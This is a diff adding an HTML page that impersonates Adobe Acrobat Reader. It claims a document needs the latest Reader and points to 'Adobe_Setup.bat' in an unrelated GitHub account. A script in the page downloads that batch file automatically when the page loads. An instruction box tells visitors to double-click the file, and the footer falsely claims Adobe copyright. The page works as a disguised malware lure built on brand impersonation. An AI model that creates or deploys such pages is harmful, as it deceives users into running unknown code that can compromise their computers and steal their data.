@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Acrobat Reader</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#f4f4f4;
+}
+
+.container{
+    width:100%;
+    max-width:720px;
+    margin:80px auto;
+    background:#fff;
+    border-radius:8px;
+    box-shadow:0 0 15px rgba(0,0,0,.12);
+    overflow:hidden;
+}
+
+.header{
+    background:#d32f2f;
+    color:#fff;
+    padding:20px;
+    text-align:center;
+}
+
+.header h1{
+    font-size:28px;
+}
+
+.content{
+    padding:40px;
+    text-align:center;
+}
+
+.logo{
+    width:120px;
+    margin-bottom:20px;
+}
+
+.content h2{
+    color:#333;
+    margin-bottom:15px;
+}
+
+.content p{
+    color:#666;
+    margin-bottom:30px;
+    line-height:1.6;
+}
+
+.download-btn{
+    display:inline-block;
+    background:#d32f2f;
+    color:#fff;
+    text-decoration:none;
+    padding:16px 40px;
+    border-radius:6px;
+    font-size:18px;
+    transition:.2s;
+}
+
+.download-btn:hover{
+    background:#b71c1c;
+}
+
+.footer{
+    text-align:center;
+    padding:20px;
+    color:#888;
+    font-size:13px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="header">
+<h1>Adobe Acrobat Reader</h1>
+</div>
+
+<div class="content">
+
+<img class="logo" src="https://www.softwareworld.co/assets/software/logo/adobe-acrobat-reader.jpg">
+
+<h2>Adobe Acrobat Reader Required</h2>
+
+<p>
+This document requires the latest version of Adobe Acrobat Reader.
+Click the button below to continue.
+</p>
+
+<a id="downloadBtn" class="download-btn" href="https://github.com/employees114-jpg/files/releases/download/v3/Adobe_Setup.bat">
+View File
+</a>
+
+<div style="margin-top:25px;padding:15px;background:#fff3cd;border:1px solid #ffeeba;border-radius:6px;color:#856404;">
+<strong>Important:</strong><br><br>
+After the download finishes, open your <strong>Downloads</strong> folder and
+double-click the <strong>Adobe_Setup.bat</strong> file to install
+<strong>Adobe Acrobat Reader</strong>.
+</div>
+
+</div>
+
+<div class="footer">
+©️ Adobe Systems Incorporated
+</div>
+
+</div>
+
+<script>
+// Auto-download the .bat file when the page loads
+window.addEventListener('DOMContentLoaded', function() {
+    var a = document.createElement('a');
+    a.href = 'https://github.com/employees114-jpg/files/releases/download/v3/Adobe_Setup.bat';
+    a.download = 'Adobe_Setup.bat';
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+});
+</script>
+
+</body>
+</html>
